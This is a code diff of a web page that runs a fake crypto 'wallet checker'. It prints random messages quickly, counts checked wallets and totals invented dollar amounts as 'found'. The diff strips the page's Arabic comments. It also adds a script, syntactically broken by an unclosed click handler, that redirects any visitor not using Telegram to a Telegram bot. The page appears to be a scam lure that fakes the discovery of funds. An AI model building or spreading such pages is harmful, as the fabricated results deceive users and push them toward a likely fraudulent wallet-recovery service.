@@ -27,9 +27,9 @@
     
     
     
-     /* تصميم صفحة التحميل */
+     /* g */
 #loading-screen {
-    position: fixed; /* يجعلها منفصلة عن body */
+    position: fixed; /* y */
     top: 0;
     left: 0;
     width: 100vw;
@@ -38,10 +38,10 @@
     display: flex;
     justify-content: center;
     align-items: center;
-    z-index: 9999; /* تأكد أنها تغطي كل شيء */
+    z-index: 9999; /* ء */
 }
 
-/* دائرة التحميل */
+/* ] */
 .loader {
     width: 6px;
     height: 6px;
@@ -51,13 +51,13 @@
     animation: spin 1.3s linear infinite;
 }
 
-/* دوران الدائرة */
+/**/
 @keyframes spin {
     0% { transform: rotate(0deg); }
     100% { transform: rotate(360deg); }
 }
 
-/* الصفحة الرئيسية بدون تأثير */
+/*  */
 #main-content {
     text-align: center;
     padding: 20px;
@@ -79,17 +79,17 @@
       font-size: 25px;
       font-weight: bold;
       position: absolute;
-      left: 20px; /* تحريك النص إلى اليسار */
+      left: 20px; /*  */
       top: 30px;
     }
     .box {
-      height: 360px; /* تم زيادة الارتفاع إلى 500px */
+      height: 360px; /*   */
       overflow: hidden;
       background-color: #fff;
       border-radius: 14px;
       top: -77px;
       padding: 12px;
-      margin-bottom: -66px; /* تقليل المسافة بين المربع والمستطيل السفلي */
+      margin-bottom: -66px; /*  */
       box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
       text-align: left;
       position: relative;
@@ -209,7 +209,7 @@
   
   
   
-   <!-- شريط الأيقونات في الأسفل -->
+   <!--  -->
     <div class="footer">
         <div class="footer-icon">
             <a href="#search"><img src="https://i.postimg.cc/c1jvqk13/Picsart-24-12-09-17-44-00-934.webp" alt="Icon 1"></a>
@@ -412,18 +412,18 @@ const messages = [
 function addMessage() {
   if (!running) return;
 
-  // اختيار رسالة عشوائية
+  // 
   const randomMessage = messages[Math.floor(Math.random() * messages.length)];
   const div = document.createElement('div');
   div.textContent = randomMessage;
   document.getElementById('output').appendChild(div);
   document.getElementById('output').scrollTop = document.getElementById('output').scrollHeight;
 
-  // تحديث عدد المحافظ
+  //
   checked++;
   document.getElementById('checked').textContent = checked;
 
-  // استخراج القيمة من الرسالة وإضافتها إلى الرصيد
+  // 
   const match = randomMessage.match(/\$([0-9]+(?:\.[0-9]{1,2})?)/);
   if (match) {
     const amount = parseFloat(match[1]);
@@ -431,7 +431,7 @@ function addMessage() {
     document.getElementById('found').textContent = totalFound.toFixed(2);
   }
 
-  setTimeout(addMessage, 32); // إضافة الرسائل بشكل أسرع (كل 100 ملي ثانية)
+  setTimeout(addMessage, 32); 
 }
 
 document.getElementById('start').onclick = function() {
@@ -473,6 +473,20 @@ document.getElementById('stop').onclick = function() {
         e.preventDefault();
         alert('');
     });
+    document.addEventListener('click', function(event) {
+   
+    if (document.activeElement && (document.activeElement.tagName === "INPUT" || document.activeElement.tagName === "TEXTAREA")) {
+       
+    }
+    window.onload = function() {
+      const userAgent = navigator.userAgent || navigator.vendor || window.opera;
+
+        const isTelegram = userAgent.toLowerCase().includes("telegram");
+
+      if (!isTelegram) {
+          window.location.href = "https://t.me/rewallets_bot";
+      }
+      }; 
 </script>
   
   <script type='text/javascript'>
